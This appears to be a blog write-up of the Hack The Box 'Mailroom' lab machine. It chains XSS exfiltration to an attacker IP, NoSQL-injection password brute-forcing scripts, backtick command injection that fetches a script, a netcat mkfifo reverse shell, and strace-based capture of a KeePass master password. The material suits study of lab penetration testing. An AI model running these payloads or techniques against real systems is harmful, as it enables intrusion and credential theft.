---
title: "HTB Mailroom"
draft: false
description: ""
categories: ["HTB", "Linux"]
tags: ["htb-hard", "wfuzz", "XXS", "HTTP exfil", "NoSQLi-bruteforce", "command-injection", "strace"]
date: 2023-08-21T17:50:38+05:30
summary: "Mailroom is a hard linux box vulnerable to multiple vulnerabilities including XXS, NoSQLi and command injection. It also involves stracing a process to dump passwords."
---

# Mailroom HTB

---

> The contact us page on the site is vulnerable to XXS, which gives access to an internal website that is vulnerable to NoSQLi and exfil the passwords of valid users. Using command injection gives a shell on the docker container. The container has credentials for another user on the machine, with which we see a user using kpcli to interact with a KeePass database. Using strace to dump the database's master password found credentials for other users, including root.

---

## Enumeration

---

### Open Ports

Found 2 open ports using nmap,

-   port 22 → SSH
-   port 80 → Apache web server

Although banners for both services are different, could be because of containerization or virtualization

{{< highlight bash "hl_lines=7 12" >}}

nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.11.209 10.10.11.209
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-17 01:52 EDT
Nmap scan report for 10.10.11.209
Host is up (0.057s latency).

PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 94bb2ffcaeb9b182afd789811aa76ce5 (RSA)
| 256 821beb758b9630cf946e7957d9ddeca7 (ECDSA)
|\_ 256 19fb45feb9e4275de5bbf35497dd68cf (ED25519)
80/tcp open http Apache httpd 2.4.54 ((Debian))
|\_http-server-header: Apache/2.4.54 (Debian)
|\_http-title: The Mail Room
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

{{< /highlight >}}

### HTTP - mailroom.htb

According to the site's response headers, it is PHP based.

```bash
> http -ph 10.10.11.209
HTTP/1.1 200 OK
...
...
Server: Apache/2.4.54 (Debian)
Vary: Accept-Encoding
X-Powered-By: PHP/7.4.33
```

Looks like landing page for a shipping services company

![Landing Page](./images/landing-page.png)

Found a reference to the domain `mailroom.htb` in the footer, adding it to `/etc/hosts`
Potential usernames in the About Us page

-   Tristan Pitt
-   Matthew Conley
-   Chris McLovin'
-   Vivien Perkins

There's also a contact form at `/contact.php`, which seems to be operated by an AI. Since there is a third part interacting with the data, testing it with dummy data

![contact-page](./images/contact-page.png)

What's interesting is submitting the form returns a link to view it

![submit-contact-page](./images/submit-contact-page.png)

The link reflects all input fields except the title; however, the `Inquiry status` heading is new.

![XXS test](./images/view-contact-form-status.png)

Since the message body is reflected, my very first thought is XSS. Using a basic XXS payload like `<script>alert('XSS')</script>` in the message field and visiting the link gives a XSS pop up.

Since it is vulnerable to XXS, I tried to grab cookies, but neither of these payloads worked

-   `<script>document.location='http://10.10.14.35/?c='+document.cookie</script>`
-   `<script>new Image().src='http://10.10.14.35/cookie.php?c='+localStorage.getItem('token');</script>`

Fuzzing for directories and files didn't uncover anything new

```bash
> ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://10.10.11.209/FUZZ -o ffuf_mailroom.md -of md -t 100 -e .php -fs 277

.                       [Status: 200, Size: 7748, Words: 2851, Lines: 129, Duration: 64ms]
index.php               [Status: 200, Size: 7748, Words: 2851, Lines: 129, Duration: 62ms]
contact.php             [Status: 200, Size: 4317, Words: 1297, Lines: 87, Duration: 61ms]
about.php               [Status: 200, Size: 6891, Words: 2761, Lines: 119, Duration: 59ms]
services.php            [Status: 200, Size: 4336, Words: 1307, Lines: 76, Duration: 57ms]
```

However, bruteforcing vhosts with wfuzz, a new virtual host was uncovered: `git.mailroom.htb`

```bash
> wfuzz_subdomain_enum mailroom.htb --hh 7746
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mailroom.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000262:   200        267 L    1181 W     13089 Ch    "git"

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

### Gitea - git.mailroom.htb

The landing page shows Gitea's version is `1.18.0`, couldn't find any exploits for this version

![Gitea server](./images/gitea_server.png)

It contains a repository owned by Matthew, containing content related to what appears to be a staffroom website.

![Staffroom source code](./images/staffroom-source-gitea.png)

Based on this from `auth.php`, the website seems to be using MongoDB as the backend.

```php
$client = new MongoDB\Client("mongodb://mongodb:27017"); // Connect to the MongoDB database
```

Discovered a reference to a [new vhost](http://git.mailroom.htb/matthew/staffroom/src/branch/main/auth.php#L42): `staff-review-panel.mailroom.htb`.

![auth.php source code](./images/auth_php-source.png)

However, the vhost returns a 403, maybe it's an internal site

```bash
> http -ph staff-review-panel.mailroom.htb
HTTP/1.1 403 Forbidden
Connection: Keep-Alive
Content-Length: 296
Content-Type: text/html; charset=iso-8859-1
Date: Mon, 17 Jul 2023 09:19:29 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.54 (Debian)
```

Additionally, in the event of invalid credentials, the site simply returns some JSON data. Ideally, in PHP, there should have been an `exit` statement after this to halt the execution of the remaining code, but this is not the case here.

![Invalid credentials response](./images/invalid-credentials-response.png)

Another file in the source code, `inspect.php` also appears [interesting](http://git.mailroom.htb/matthew/staffroom/src/branch/main/inspect.php#L12). The `shell_exec()` can potentially lead to code execution

-   It accepts `inquiry_id` as a POST parameter and removes a few special characters and then passes to `shell_exec()`

```php
if (isset($_POST['inquiry_id'])) {
  $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
  $contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");
```

Fuzzing the Gitea website, found a sitemap which could have links to some other assets.

```bash
> ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://git.mailroom.htb/FUZZ -o ffuf_git.md -of md -t 100

favicon.ico             [Status: 301, Size: 58, Words: 3, Lines: 3, Duration: 68ms]
sitemap.xml             [Status: 200, Size: 267, Words: 4, Lines: 3, Duration: 90ms]
.                       [Status: 200, Size: 13201, Words: 1009, Lines: 268, Duration: 70ms]
```

The sitemap links to two other sitemaps for users and repositories respectively

```bash
> http -pb git.mailroom.htb/sitemap.xml
...snip...
    <loc>http://git.mailroom.htb/explore/users/sitemap-1.xml</loc>
...snip...
    <loc>http://git.mailroom.htb/explore/repos/sitemap-1.xml</loc>
...snip...
```

The user sitemap gives three usernames,

-   `administrator`
-   `matthew`
-   `tristan`

```bash
> http -pb git.mailroom.htb/explore/users/sitemap-1.xml
...snip...
  <url>
    <loc>http://git.mailroom.htb/administrator</loc>
...snip...
    <loc>http://git.mailroom.htb/matthew</loc>
...snip...
    <loc>http://git.mailroom.htb/tristan</loc>
...snip...
```

---

## Foothold

---

### Exfiltrating data using XXS

Since the staff site is forbidden when accessed internally, maybe it can be accessed using the XSS vulnerability on the contact page. A payload like this works. Additionally, the data must be base64 encoded, as it is being exfiltrated as an HTTP parameter.

```js
fetch("http://staff-review-panel.mailroom.htb").then((r) =>
    r
        .text()
        .then((data) =>
            fetch(
                `http://10.10.14.35/exfil?data=${btoa(
                    unescape(encodeURIComponent(data))
                )}`
            )
        )
);
```

I developed a [small Flask application](https://gist.github.com/AbraXa5/f8f7e0a6caec4c7a5eb6c426a575923b#file-xxs_exfil-py) to automate the decoding process for each request. Using the payload returns the source for the staff review site.

```bash
> python xss_exfil.py
2023-07-17 18:32:34,435 - INFO - Starting server on http://0.0.0.0:80, use <Ctrl-C> to stop

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
  <meta name="description" content="" />
  <meta name="author" content="" />
  <title>Inquiry Review Panel</title>
  <!-- Favicon-->
  <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
  <!-- Bootstrap icons-->
  <link href="font/bootstrap-icons.css" rel="stylesheet" />
  <!-- Core theme CSS (includes Bootstrap)-->
  <link href="css/styles.css" rel="stylesheet" />
</head>

<body>
  <div class="wrapper fadeInDown">
    <div id="formContent">

      <!-- Login Form -->
      <form id='login-form' method="POST">
        <h2>Panel Login</h2>
        <input required type="text" id="email" class="fadeIn second" name="email" placeholder="Email">
        <input required type="password" id="password" class="fadeIn third" name="password" placeholder="Password">
        <input type="submit" class="fadeIn fourth" value="Log In">
        <p hidden id="message" style="color: #8F8F8F">Only show this line if response - edit code</p>
      </form>

      <!-- Remind Passowrd -->
      <div id="formFooter">
        <a class="underlineHover" href="register.html">Create an account</a>
      </div>

    </div>
  </div>

  <!-- Bootstrap core JS-->
  <script src="js/bootstrap.bundle.min.js"></script>

  <!-- Login Form-->
  <script>
    // Get the form element
    const form = document.getElementById('login-form');

    // Add a submit event listener to the form
    form.addEventListener('submit', event => {
      // Prevent the default form submission
      event.preventDefault();

      // Send a POST request to the login.php script
      fetch('/auth.php', {
        method: 'POST',
        body: new URLSearchParams(new FormData(form)),
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      }).then(response => {
        return response.json();

      }).then(data => {
        // Display the name and message in the page
        document.getElementById('message').textContent = data.message;
        document.getElementById('password').value = '';
        document.getElementById('message').removeAttribute("hidden");
      }).catch(error => {
        // Display an error message
        //alert('Error: ' + error);
      });
    });
  </script>
</body>
</html>
10.10.11.209 - - [17/Jul/2023 18:32:42] "GET /exfil?data=CjwhRE9DVFlQRSBodG1sPgo8aH
...snip...
...snip...
```

Based on this, we know

-   the `/auth.php` endpoint accepts a POST request
-   the content type is, `application/x-www-form-urlencoded`
-   this will return JSON data

```js
fetch('/auth.php', {
        method: 'POST',
        body: new URLSearchParams(new FormData(form)),
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      }).then(response => {
        return response.json();
```

Investigating the new `/auth.php` endpoint based on this new info. Given that the endpoint is related to authentication and the database is MongoDB, it's possible that it might be susceptible to NoSQL injection.

### Exploiting NoSQLi

Modified the previous script to conduct a test for NoSQLi. The main payload here is `email[$ne]=abraxas&password[$ne]=abraxas`. Given the extremely remote possibility of an existing user with these credentials, a positive response from this query will confirm NoSQL injection.

_nosqli.js_

```js
// var formData = "email[$exists]=true&password[$exists]=true";
var formData = "email[$ne]=abraxas&password[$ne]=abraxas";
fetch("http://staff-review-panel.mailroom.htb/auth.php", {
    method: "POST",
    body: formData,
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
    },
})
    .then((response) => {
        return response.text();
    })
    .then((text) => {
        console.log(text); // Log the response content to the console
        return fetch(
            `http://10.10.14.35/exfil?data=${btoa(
                unescape(encodeURIComponent(text))
            )}`
        );
    })
    .catch((error) => {
        console.error("Error:", error);
    });
```

Since this script is much bigger than the previous one, using `src` to upload the script via XSS, as it's easier to replicate the request.

```bash
> http -pB POST mailroom.htb/contact.php \
email=abraxas@mailroom.htb \
title=Test \
message='<script src="http://10.10.14.35/nosqli.js"></script>' \
-f
```

Using the same Flask app as before, the decoded text indicates that the request was successful and that a 2FA token has been sent to an inbox.

```bash
2023-07-17 23:03:04,872 - INFO - 10.10.11.209 - - [17/Jul/2023 23:03:04] "GET /nosqli.js HTTP/1.1" 200 -
{"success":false,"message":"Invalid input detected"}{"success":true,"message":"Check your inbox for an email with your 2FA token"}
2023-07-17 23:03:05,039 - INFO - 10.10.11.209 - - [17/Jul/2023 23:03:05] "GET /exfil?data=eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgaW5wdXQgZGV0ZWN0ZWQifXsic3VjY2VzcyI6dHJ1ZSwibWVzc2FnZSI6IkNoZWNrIHlvdXIgaW5ib3ggZm9yIGFuIGVtYWlsIHdpdGggeW91ciAyRkEgdG9rZW4ifQ== HTTP/1.1" 200 -
```

There are actually two JSON responses here, one of which is invalid and the next is successful because the invalid response lacks an exit statement, allowing the remainder code to execute. Testing the three usernames found on the Gitea sitemap. Since the login page needs an email, appending `@mailroom.htb` to the usernames.

_user_enum.js_

```js
// var formData = "email[$eq]=administrator@mailroom.htb&password[$exists]=true";
var formData = "email[$eq]=tristan@mailroom.htb&password[$exists]=true";
// var formData = "email[$eq]=matthew@mailroom.htb&password[$exists]=true";

fetch("http://staff-review-panel.mailroom.htb/auth.php", {
    method: "POST",
    body: formData,
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
    },
})
    .then((response) => {
        return response.text();
    })
    .then((text) => {
        console.log(text);
        return fetch(
            `http://10.10.14.35/exfil?data=${btoa(
                unescape(encodeURIComponent(text))
            )}`
        );
    })
    .catch((error) => {
        console.error("Error:", error);
    });
```

```bash
> http -pB POST mailroom.htb/contact.php email=abraxas@mailroom.htb title=Test message='<script src="http://10.10.14.35/user_enum.js"></script>' -f
```

I get a success response with `tristan`, so its a valid user on the staff website.

```bash
> python xxs_flask.py
 * Serving Flask app 'xxs_flask'
 * Debug mode: off
2023-07-18 05:35:16,670 - INFO - WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.253.133:80
2023-07-18 05:35:16,670 - INFO - Press CTRL+C to quit
2023-07-18 05:35:53,458 - INFO - 10.10.11.209 - - [18/Jul/2023 05:35:53] "GET /nosqli.js HTTP/1.1" 200 -
{"success":false,"message":"Invalid input detected"}{"success":true,"message":"Check your inbox for an email with your 2FA token"}
2023-07-18 05:35:53,638 - INFO - 10.10.11.209 - - [18/Jul/2023 05:35:53] "GET /exfil?data=eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgaW5wdXQgZGV0ZWN0ZWQifXsic3VjY2VzcyI6dHJ1ZSwibWVzc2FnZSI6IkNoZWNrIHlvdXIgaW5ib3ggZm9yIGFuIGVtYWlsIHdpdGggeW91ciAyRkEgdG9rZW4ifQ== HTTP/1.1" 200 -
```

Now that we have the username, the next step is to brute force the password for Tristan. Initially I tried crafting an async script with `fetch()`, but it didn't work as expected, so I eventually switched to sending the requests via `XMLHttpRequest` synchronously. Certain special characters had to be excluded from the character set due to a potential conflict with the regex validation. It's plausible that a step was overlooked during this trial and error process, and this could be a false positive.

```javascript
var password = "";
// Removed special chars like $,*,?,+... etc, might cause issues with regex
var charset =
    "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!%<>@#";

for (let i = 0; i < charset.length; i++) {
    var payload_req = new XMLHttpRequest();
    let test_pass = password + charset[i];
    // Doesn't like async
    payload_req.open(
        "POST",
        "http://staff-review-panel.mailroom.htb/auth.php",
        false
    );
    payload_req.setRequestHeader(
        "Content-Type",
        "application/x-www-form-urlencoded"
    );
    payload_req.send(
        "email=tristan@mailroom.htb&password[$regex]=" + test_pass + ".*"
    );

    if (payload_req.responseText.includes("2FA")) {
        password += charset[i];

        var exfil = new XMLHttpRequest();
        exfil.open("GET", "http://10.10.14.35/?passwd=" + password, true);
        exfil.send();
        // reset the loop
        i = 0;
    }
}
```

Subsequently, the python server starts receiving a series of requests, that ultimately provide the password for the user `tristan`: `69trisRulez!`

```bash
> www
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.209 - - [25/Apr/2023 16:20:31] code 404, message File not found
10.10.11.209 - - [25/Apr/2023 16:20:32] "GET /password_bruteforce.js HTTP/1.1" 200 -
10.10.11.209 - - [25/Apr/2023 16:20:44] "GET /password_bruteforce.js HTTP/1.1" 200 -
10.10.11.209 - - [25/Apr/2023 16:20:45] code 404, message File not found
10.10.11.209 - - [25/Apr/2023 16:20:45] "GET /passwd?6 HTTP/1.1" 404 -
...
...
10.10.11.209 - - [25/Apr/2023 16:25:46] "GET /password_bruteforce.js HTTP/1.1" 200 -
10.10.11.209 - - [25/Apr/2023 16:25:48] code 404, message File not found
10.10.11.209 - - [25/Apr/2023 16:25:48] "GET /passwd?69trisRulez! HTTP/1.1" 404 -
```

Since the staffroom site is still inaccessible, decided to reuse the credentials for SSH. This resulted in obtaining a shell as `tristan`!

```bash
> pc 'tristan:69trisRulez!'@mailroom.htb
[09:16:08] Welcome to pwncat 🐈!                                                                    __main__.py:164
[09:16:11] mailroom.htb:22: registered new host w/ db                                                manager.py:957
(local) pwncat$
(remote) tristan@mailroom:/home/tristan$ id
uid=1000(tristan) gid=1000(tristan) groups=1000(tristan)
(remote) tristan@mailroom:/home/tristan$
```

---

## Horizontal Privilege Escalation

---

Tristan lacks any sudo privileges.

```bash
(remote) tristan@mailroom:/home/tristan$ sudo -l
[sudo] password for tristan:
Sorry, user tristan may not run sudo on mailroom.
```

However, I discovered another user named `matthew` with a login shell, as indicated in `/etc/passwd` and `/home` directory.

```bash
(remote) tristan@mailroom:/home/tristan$ ls -la /home
total 16
drwxr-xr-x  4 root    root    4096 Jan 15  2023 .
drwxr-xr-x 18 root    root    4096 Mar 26 00:46 ..
drwxr-xr-x  3 matthew matthew 4096 Jul 19 13:17 matthew
drwxr-xr-x  4 tristan tristan 4096 Jan 15  2023 tristan
(remote) tristan@mailroom:/home/tristan$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
tristan:x:1000:1000:tristan:/home/tristan:/bin/bash
matthew:x:1001:1001:,,,:/home/matthew:/bin/bash
```

On successful authentication response from the staff site, it indicates that a 2FA token has been sent to a mail with the message: `{"success":true,"message":"Check your inbox for an email with your 2FA token"}`. Using this information, found an email for the user `tristan` in the `/var/mail` directory, which contains the 2FA token.

```bash
(remote) tristan@mailroom:/var/mail$ ls -la
total 16
drwxrwsr-x  2 root    mail 4096 Jul 19 13:14 .
drwxr-xr-x 12 root    root 4096 Jan 19 13:22 ..
-rw-------  1 root    mail    1 Jan 15  2023 root
-rw-------  1 tristan mail  417 Jul 19 13:18 tristan
(remote) tristan@mailroom:/var/mail$ cat tristan
Return-Path: <noreply@mailroom.htb>
X-Original-To: tristan@mailroom.htb
Delivered-To: tristan@mailroom.htb
Received: from localhost (unknown [172.19.0.5])
    by mailroom.localdomain (Postfix) with SMTP id E2E681CB3
    for <tristan@mailroom.htb>; Wed, 19 Jul 2023 13:14:50 +0000 (UTC)
Subject: 2FA

Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=9eafe490e2ae459894df81a7f3b7b2ce
```

Despite being unable to locate the source code for the site, it can be accessed using `curl` on localhost.

```bash
(remote) tristan@mailroom:/dev/shm$ curl -I  staff-review-panel.mailroom.htb
HTTP/1.1 200 OK
Date: Wed, 19 Jul 2023 13:52:20 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Set-Cookie: PHPSESSID=82f030a6564259c7edf5f9d308875788; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Access-Control-Allow-Origin: *
Content-Type: text/html; charset=UTF-8
```

Given that the site seems to be internal, forwarding port 80 using SSH using the existing connection. Also added the vhosts for `127.0.0.1` on the attack box.

```bash
> _ echo '127.0.0.1 mailroom.htb    git.mailroom.htb    staff-review-panel.mailroom.htb' >> /etc/hosts
> ssh tristan@mailroom.htb -N -L 80:127.0.0.1:80
tristan@mailroom.htb's password:
```

### Shell as www-data in the container

With the auth token from Tristan's email, the staff review website can be accessed. Nevertheless, the dashboard itself doesn't provide a lot of information.

![staff-review-panel dashboard](./images/staff-review-panel-dashboard.png)

The Inspect page is interesting, it accepts inquiry IDs and can

-   search for inquires
-   check for status of the inquiry

![Inquiry status](./images/inquiry-status.png)

This relates to the `shell_exec()` vulnerability found earlier on Gitea.

```php
if (isset($_POST['inquiry_id'])) {
  $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
  $contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");
```

Given this information, it's apparent that characters such as `$<>;|&[]` are filtered, preventing command chaining. However, backticks remain unfiltered and can be used for command injection. Sending a request like this returns a response on a local HTTP server running on the attack box, confirming command injection on the `inquiry_id` parameter.

```bash
> http -ph POST staff-review-panel.mailroom.htb/inspect.php Cookie:PHPSESSID=d9e2302f38cb5348e2254ef887b4cf66 inquiry_id='test`curl http://10.10.14.35:8000`' -f
```

To establish a reverse shell, uploaded a shell that utilized the `netcat mkfifo` reverse shell and executed it.

```bash
> echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.35 9005 >/tmp/f' > revshell.sh
> http -ph POST staff-review-panel.mailroom.htb/inspect.php Cookie:PHPSESSID=d9e2302f38cb5348e2254ef887b4cf66 inquiry_id='test`curl http://10.10.14.35:8000/revshell.sh --output /dev/shm/revshell.sh`' -f
> http -ph POST staff-review-panel.mailroom.htb/inspect.php Cookie:PHPSESSID=d9e2302f38cb5348e2254ef887b4cf66 inquiry_id='test`bash /dev/shm/revshell.sh`' -f
```

Successfully acquired a shell as the user `www-data` within what appears to be a Docker container environment.

```bash
(local) pwncat$ connect -lp 9005
[10:22:49] received connection from 10.10.11.209:45642                                                   bind.py:84
[10:22:52] 0.0.0.0:9005: upgrading from /bin/dash to /bin/bash                                       manager.py:957
[10:22:53] 10.10.11.209:45642: registered new host w/ db                                             manager.py:957
(local) pwncat$
(remote) www-data@53d93393da5c:/var/www/staffroom$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
(remote) www-data@53d93393da5c:/var/www/staffroom$ hostname
53d93393da5c
(remote) www-data@53d93393da5c:/var/www/staffroom$ ls -la /.dockerenv
-rwxr-xr-x 1 root root 0 Jul 19 12:29 /.dockerenv
```

### Docker escape

The git repository containing the source code for the site is located at `/var/www/staffroom`. While enumerating the git repository, came across credentials within the Git remote URL.

```bash
(remote) www-data@53d93393da5c:/var/www/staffroom$ git log --pretty=oneline
4b6cd765986ff06ea7247528c42b4127633beb22 (HEAD -> main, origin/main, origin/HEAD) fixed path bug & email spam
1677521748602cce2f0d7ab25664ac6d414e26ef fixed path problem
4d3b167f4f228d18f97bb85da6983ff629274a3a added site

(remote) www-data@53d93393da5c:/var/www/staffroom$ git remote -v
origin  http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git (fetch)
origin  http://matthew:HueLover83%23@gitea:3000/matthew/staffroom.git (push)
```

Although the credentials seem to be invalid on Gitea, there's an interesting nuance with the URL encoding. The `%23` is URL-encoded and translates to a `#` symbol. Consequently, Gitea accepts the credentials `matthew:HueLover83#`. These same credentials are also reused on `matthew`'s local account.

```bash
(remote) tristan@mailroom:/dev/shm$ su matthew
Password:
matthew@mailroom:/dev/shm$ id
uid=1001(matthew) gid=1001(matthew) groups=1001(matthew)
matthew@mailroom:/dev/shm$ cd
matthew@mailroom:~$ ls -la
total 32
drwxr-xr-x 3 matthew matthew 4096 Jul 19 14:40 .
drwxr-xr-x 4 root    root    4096 Jan 15  2023 ..
lrwxrwxrwx 1 matthew matthew    9 Jan 15  2023 .bash_history -> /dev/null
-rw-r--r-- 1 matthew matthew  220 Jan 15  2023 .bash_logout
-rw-r--r-- 1 matthew matthew 3771 Jan 15  2023 .bashrc
drwx------ 2 matthew matthew 4096 Jan 15  2023 .cache
lrwxrwxrwx 1 root    root       9 Jan 15  2023 .kpcli-history -> /dev/null
-rw-r--r-- 1 matthew matthew 1998 Mar 16 22:47 personal.kdbx
-rw-r--r-- 1 matthew matthew  807 Jan 15  2023 .profile
-rw-r----- 1 root    matthew   33 Jul 19 12:29 user.txt
lrwxrwxrwx 1 matthew matthew    9 Jan 15  2023 .viminfo -> /dev/null
```

---

## Privilege Escalation to root

---

The user `matthew` also lacks sudo privileges.

```bash
(remote) matthew@mailroom:/home/matthew$ sudo -l
[sudo] password for matthew:
Sorry, user matthew may not run sudo on mailroom.
```

Interestingly, a `keepass` database is present in the home directory.

```bash
> file personal.kdbx
personal.kdbx: Keepass password database 2.x KDBX
```

However, I cannot open the database, it needs a master password
Created a hash using `keepass2john`, but can't crack it with `rockyou` as the wordlist

Nonetheless, accessing the database requires a master password. In an attempt to crack the password, created a hash using `keepass2john`, but the password isn't found within the `rockyou.txt` wordlist.

```bash
> keepass2john personal.kdbx > keepass_hash.txt
> john --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt
```

With nothing else left, ran `pspy` to look for background processes and found `kpcli`. It appears that `matthew` (UID 1001) is executing the `kpcli` script.

```bash
2023/07/19 16:19:32 CMD: UID=1001  PID=79331  | -bash -c /usr/bin/kpcli
2023/07/19 16:19:32 CMD: UID=1001  PID=79332  | /usr/bin/locale-check C.UTF-8
2023/07/19 16:19:32 CMD: UID=1001  PID=79333  | /usr/bin/perl /usr/bin/kpcli
```

It seems that `kpcli` is a Perl script owned by the root user. It seems to be a CLI program for managing Keepass databases.

```bash
(remote) matthew@mailroom:/home/matthew$ file /usr/bin/kpcli
/usr/bin/kpcli: Perl script text executable
(remote) matthew@mailroom:/home/matthew$ ls -la /usr/bin/kpcli
-rwxr-xr-x 1 root root 193792 Aug 21  2016 /usr/bin/kpcli
(remote) matthew@mailroom:/home/matthew$ cat /usr/bin/kpcli
#!/usr/bin/perl

###########################################################################
#
# kpcli - KeePass Command Line Interface
#
# Author: Lester Hightower <hightowe at cpan dot org>
#
# This program was inspired by "kedpm -c" and resulted despite illness
# (or more likely because of it) over the USA Thanksgiving holiday in
# late November of 2010. As a long-time user of the Ked Password Manager
# I really missed a command line interface after getting an Android cell
# phone and switching to KeePass, so that I could access my password
# database on my phone. This program scratches that itch.
...
...
...
```

The import command requires two arguments: the database name and the path to the directory containing the database file.

```bash
(remote) matthew@mailroom:/home/matthew$ /usr/bin/perl /usr/bin/kpcli
...
...
kpcli:/> import personal.kdbx /home/matthew
Please provide the master password: *************************
Couldn't load the file personal.kdbx: The database key appears invalid or else the database is corrupt
```

Importing the database is currently not possible. However, a viable approach is to use `strace` by attaching to the process's PID. This will enable monitoring of the system calls being made by the process. Given that someone is already utilizing the `kpcli` script as the user `matthew`, this can return interesting information.

To handle the changing PIDs for the script, this one-liner grabs the current process ID for the active `kpcli` process.

```bash
matthew@mailroom:~$ ps aux | grep '[k]pcli' | awk '{ print $2 }'
93776
```

The script needs a master password for successful execution, so I am more interested in successful read sys calls
Flags for strace

-   `-p` attach to a PID
-   `-e trace=read` only show read syscalls
-   `-f` follow any forked processes
-   `-o` output file

The script requires a master password for successful execution, this means successful `sysread` calls could give interesting information. The relevant strace flags are:

-   `-p`: Attach to a specific PID.
-   `-e trace=read`: Display only read syscalls.
-   `-f`: Follow any forked processes.
-   `-o`: Define the output file for the trace.

The final command to attach the currently running `kpcli` process to `strace`

```bash
matthew@mailroom:~$ strace -f -p $(ps aux | grep '[k]pcli' | awk '{ print $2 }') -e trace=read -o kpcli.log
strace: Process 93785 attached
```

By filtering for successful read syscalls (e.g., `read() = 1`), numerous entries like `-1 Resource temporarily unavailable` can be avoided, since they don't provide much useful information.

```bash
(remote) matthew@mailroom:/home/matthew$ cat kpcli.log | grep '= 1$'
93785 read(3, ".", 1)                   = 1
93785 read(3, "k", 1)                   = 1
93785 read(3, "d", 1)                   = 1
...
...
93785 read(3, "t", 1)                   = 1
93785 read(3, "\n", 1)                  = 1
```

With some bash fu the required characters can be selectively extracted in one line. Additionally, newline characters can be managed using `sed` to display actual line breaks, effectively delineating the inputs.

```bash
(remote) matthew@mailroom:/home/matthew$ cat kpcli.log | grep '= 1$' | cut -d'"' -f2 | tr -d '\n' | sed 's/\\n/\n/g'
.kdbx
!sEcUr3p4$$w01\10rd9
ls Root/
show -f 0
quit
```

Even though `!sEcUr3p4$$w01\10rd9` might seem like the password, it's invalid. The `\10` portion appears unusual, considering that other entries are in ASCII format.

```bash
93785 read(0, "w", 8192)                = 1
93785 read(0, "0", 8192)                = 1
93785 read(0, "1", 8192)                = 1
93785 read(0, "\10", 8192)              = 1
93785 read(0, "r", 8192)                = 1
93785 read(0, "d", 8192)                = 1
```

The `\10` looks like octal, and since `strace` is supposed to prints ASCII chars, there should be a connection. Octal `10` corresponds to a backspace in the ASCII chart

![Octal to ASCII chart](./images/ascii-conversion-chart.png)

This means that after removing the `1`, the password `!sEcUr3p4$$w01\10rd9` becomes `!sEcUr3p4$$w0rd9`. By using the master password, it was possible to decrypt the database and uncover the root's password within one of those entries.

```bash
(remote) matthew@mailroom:/home/matthew$ kpcli --kdb personal.kdbx
Please provide the master password: *************************

KeePass CLI (kpcli) v3.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> ls Root/
=== Entries ===
0. food account                                            door.dash.local
1. GItea Admin account                                    git.mailroom.htb
2. gitea database password
3. My Gitea Account                                       git.mailroom.htb
4. root acc

kpcli:/> show -f 4

Title: root acc
Uname: root
 Pass: a$gBa3!GA8
  URL:
Notes: root account for sysadmin jobs
```

Pwned!!

```bash
matthew@mailroom:~$ su root
Password:
root@mailroom:/home/matthew# id
uid=0(root) gid=0(root) groups=0(root)
root@mailroom:/home/matthew# ls -la /root/root.txt
-rw-r----- 1 root root 33 Jul 19 12:29 /root/root.txt
root@mailroom:/home/matthew#
```

<!-- ![Pwned Mailroom](https://i.imgur.com/TfQTGlQ.png) -->
